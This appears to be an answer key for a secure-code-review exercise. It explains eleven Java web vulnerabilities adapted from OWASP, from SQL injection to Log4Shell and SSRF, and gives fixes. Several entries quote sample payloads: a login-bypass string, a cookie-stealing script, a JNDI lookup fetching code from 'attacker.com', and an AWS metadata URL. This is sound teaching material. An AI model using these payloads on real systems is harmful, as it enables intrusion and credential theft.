title: SQL Injection via String Concatenation
explanation: Lines 17-18 build the SQL query by directly concatenating the `username` and `password` parameters into the query string. An attacker can inject SQL syntax — for example, entering `' OR '1'='1` as the username bypasses authentication entirely. Fix: use a `PreparedStatement` with parameterised placeholders (`?`) so the database driver handles escaping.
source: Adapted from OWASP WebGoat — SQL Injection module

title: Reflected XSS in Servlet Response
explanation: Line 19 writes the raw `query` parameter from the HTTP request directly into the HTML response without encoding. An attacker can craft a URL such as `?q=<script>alert(document.cookie)</script>` and trick a victim into clicking it, causing the browser to execute attacker-controlled JavaScript in the context of the site. Fix: HTML-encode user-supplied values before rendering them — for example using `StringEscapeUtils.escapeHtml4(query)` from Apache Commons Text.
source: Adapted from OWASP WebGoat — Cross-Site Scripting module

title: XXE via Unconfigured DocumentBuilder
explanation: Line 10 creates a `DocumentBuilderFactory` with default settings. By default, Java's XML parser supports external entity references (XXE). An attacker who controls the XML input can include a `<!DOCTYPE>` declaration with an `ENTITY` that reads a local file (e.g. `/etc/passwd`) or makes a network request to an internal service. Fix: disable external entity processing before parsing — call `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` immediately after creating the factory.
source: Adapted from OWASP XXE Prevention Cheat Sheet

title: Insecure Direct Object Reference via Request Parameter
explanation: Line 26 passes the `userId` request parameter directly into the SQL query without checking that it matches the currently authenticated user (retrieved on line 20 but never compared). An attacker can change the `userId` parameter in the URL to any other user's ID and retrieve their account balance and account number. Fix: replace `requestedUserId` with `loggedInUser` in the PreparedStatement, or assert they are equal before querying.
source: Adapted from OWASP IDOR — Testing for Insecure Direct Object References (OTG-AUTHZ-004)

title: Hardcoded Admin Password in Source Code
explanation: Line 10 stores the admin password as a plain-text string constant in source code. Anyone with read access to the repository — now or in git history — can extract the credential and authenticate as admin. Fix: store credentials outside the codebase (e.g. environment variables or a secrets manager) and compare against a securely hashed value rather than a literal string.
source: Adapted from OWASP Authentication Cheat Sheet — Credential Storage

title: MD5 Used for Password Hashing
explanation: Line 11 uses MD5, a fast general-purpose hash, to store passwords. MD5 is cryptographically broken and its speed makes brute-force and rainbow-table attacks trivial — billions of MD5 hashes can be computed per second on commodity hardware. Fix: use a password-hashing function designed for this purpose — BCrypt, SCrypt, or Argon2 — which incorporate a salt and are intentionally slow.
source: Adapted from OWASP Password Storage Cheat Sheet

title: Unsafe Java Deserialization from Cookie
explanation: Lines 31–32 deserialise a Base64-decoded cookie value using Java's native `ObjectInputStream.readObject()` without any class allow-listing. An attacker can craft a malicious serialised Java object (using tools like ysoserial) and submit it as the cookie, triggering arbitrary code execution during deserialisation. Fix: never deserialise untrusted data with native Java serialisation; use a data-format like JSON with strict schema validation, or use a deserialisation filter (`ObjectInputFilter`) that allowlists only expected classes.
source: Adapted from OWASP Deserialization Cheat Sheet

title: Plaintext Password Written to Application Log
explanation: Line 19 logs the user-supplied `password` value at INFO level on every login attempt. Anyone with access to the log files — including log aggregation systems, monitoring dashboards, or shared log storage — can read users' plaintext passwords. Fix: log only the username and a sanitised event marker (e.g. `login_attempt`) and never log credential values at any log level.
source: Adapted from OWASP Logging Cheat Sheet — What to Exclude

title: Race Condition in Balance Transfer
explanation: Lines 19 and 21 read the account balance and then check it outside a database transaction or row-level lock. A concurrent request can read the same balance between these two lines, pass the insufficient-funds check, and both transfers proceed — allowing a user to spend the same funds twice (a double-spend). Fix: wrap the entire transfer in a database transaction with `SELECT ... FOR UPDATE` to lock the source row, ensuring the balance check and debit are atomic.
source: Adapted from OWASP Race Conditions — TOCTOU (Time-of-check Time-of-use)

title: Log4Shell: User Input in Log4j Format String
explanation: Line 22 concatenates unsanitised user input directly into a Log4j `logger.info()` call using string concatenation rather than a parameterised format string. On Log4j 2 versions prior to 2.17.1, this enables Log4Shell (CVE-2021-44228): if the username contains a JNDI lookup pattern such as `${jndi:ldap://attacker.com/a}`, Log4j resolves the JNDI reference and fetches attacker-controlled code, leading to remote code execution. Fix: upgrade Log4j to 2.17.1 or later, and always pass user input as a format argument (`logger.info("user: {}", username)`) rather than by string concatenation.

title: Server-Side Request Forgery via URL Parameter
explanation: Line 31 passes the user-supplied `url` parameter directly to `URI.create()` with no allow-list or scheme validation. An attacker can supply an internal URL (e.g. `http://169.254.169.254/latest/meta-data/` for AWS instance metadata, or `http://internal-service/admin`) causing the server to make requests on the attacker's behalf to systems that are not publicly accessible. Fix: validate the URL against an explicit allow-list of permitted hostnames and schemes before making the request, and block private IP ranges.
source: Adapted from OWASP SSRF Prevention Cheat Sheet
